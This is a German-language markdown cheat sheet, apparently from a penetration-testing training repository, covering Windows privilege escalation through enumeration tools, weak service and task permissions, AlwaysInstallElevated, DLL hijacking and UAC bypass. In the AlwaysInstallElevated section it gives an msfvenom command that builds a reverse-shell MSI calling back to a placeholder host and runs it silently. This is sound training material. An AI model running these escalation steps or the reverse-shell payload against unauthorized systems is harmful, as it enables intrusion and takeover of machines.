# 🪟 Windows Privilege Escalation 

## Inhaltsverzeichnis
- [Einleitung](#einleitung)
- [Nützliche Tools](#nützliche-tools)
- [Typische Escalation-Vektoren](#typische-escalation-vektoren)
- [Tipps zur Analyse](#tipps-zur-analyse)
- [Weiterführende Links](#weiterführende-links)
- [Haftungsausschluss](#haftungsausschluss)

## Einleitung

Diese Datei dokumentiert Methoden, Tools und Vorgehensweisen zur Privilegienerweiterung (Privilege Escalation) auf **Windows-Systemen**. Sie dient ausschließlich zu **Schulungszwecken** im Rahmen von Penetration Tests und Security-Audits durch autorisierte Fachkräfte.



## Nützliche Tools

### 1. `whoami`-Befehle

```bash
whoami /user           # Aktueller Benutzername mit SID
whoami /groups         # Gruppenmitgliedschaften (z. B. Admins)
whoami /priv           # Aktive Berechtigungen des Benutzers
```

### 2. `accesschk.exe` von Sysinternals

Tool zur Analyse von Zugriffsrechten:

```bash
accesschk.exe -uws "Benutzer" *               # Zugriffsrechte auf Dienste
accesschk.exe -ucqv Benutzer Pfad\zur\Datei  # Detaillierte Rechteprüfung
```

### 3. `Seatbelt.exe`

Tool zur Informationssammlung auf dem Zielsystem (C#):

```bash
Seatbelt.exe all
```

Funktioniert gut bei eingeschränkten Benutzerrechten – erkennt z. B. gespeicherte Passwörter, schwache Registry-Einstellungen usw.

### 4. `WinPEAS.exe`

Automatisiertes Enumeration-Tool:

```bash
WinPEASx64.exe oder WinPEASx86.exe
```

Identifiziert potenzielle Schwachstellen wie Dienste mit schwachen ACLs, ungesicherte Tasks, UAC-Bypass-Möglichkeiten etc.



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Typische Escalation-Vektoren

### 1. Unquoted Service Paths

Nicht in Anführungszeichen gesetzte Pfade in Diensten:

```bash
sc qc <ServiceName>
```

Pfad zu ausführbarer Datei enthält Leerzeichen → eigene Binärdatei einschleusen.

### 2. Schwache Dienstrechte (Insecure Permissions)

Benutzer hat Schreibrechte auf den Dienst:

```bash
accesschk.exe -uws Benutzer *
```

→ Dienstdatei oder Binärpfad ersetzen.

### 3. Scheduled Tasks mit schwachen Rechten

```bash
taskschd.msc
schtasks /query /fo LIST /v
```

→ Aufgabe manipulieren oder durch Trojaner ersetzen.

### 4. AlwaysInstallElevated (MSI-Bypass)

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

Werte:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

Dann:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi
msiexec /quiet /qn /i shell.msi
```

### 5. DLL Hijacking

Wenn ein ausführbares Programm DLLs aus unsicheren Pfaden lädt:

* `.dll` Datei mit Payload erstellen
* In priorisierten Ordnern (gleicher Pfad wie EXE) ablegen

Tools zur Analyse: [Procmon.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)

### 6. UAC-Bypass (User Access Control)

Identifiziere UAC-schwache Prozesse:

* `fodhelper.exe`
* `eventvwr.exe`

UACMe-Tool: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)



## Tipps zur Analyse

* **PowerUp.ps1** (PowerShell Framework)
* **SharpUp** (C#): Enumeration wie PowerUp, aber für AV-Bypass geeignet
* **Windows Exploit Suggester – Next Generation**



## Weiterführende Links

* [GTFOBins Windows Pendant: LOLBAS](https://lolbas-project.github.io/)
* [Windows-Privilege-Escalation-Cheat-Sheet](https://github.com/netbiosX/Checklists)



## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---